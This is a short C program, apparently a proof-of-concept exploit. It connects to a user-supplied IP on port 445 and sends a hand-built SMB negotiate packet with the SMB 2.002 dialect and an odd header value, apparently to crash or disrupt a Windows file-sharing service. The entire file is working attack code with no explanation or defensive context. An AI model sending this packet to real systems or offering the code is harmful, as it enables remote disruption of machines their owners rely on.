#include <stdio.h>
#include <winsock2.h>

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersion = MAKEWORD(2, 2);
	SOCKET s;
	SOCKADDR_IN serverAddr;
	int ret, nPort = 445;
	char *buff = "\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00";

	if (argc < 2) {
		printf("Usage: prog.exe <ip>");
		return 1;
	}

	if ((ret = WSAStartup(wVersion, &wsaData)) != 0 ) {
		printf("WSAStartup failed with error %d.\n", ret);
		return 1;
	}

	if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		printf("Socket failed with error %d.\n", WSAGetLastError());
		return 1;
	}

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = inet_addr(argv[1]);
	serverAddr.sin_port = htons(nPort);

	if (connect(s, (SOCKADDR *) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
		printf("Connection to server failed.\n");
		closesocket(s);
		return 1;
	}

	send(s, buff, 148, 0);

	if (WSACleanup() == SOCKET_ERROR) {
		printf("WSACleanup failed with error %d.\n", WSAGetLastError());
		return 1;
	}

	return 0;
}
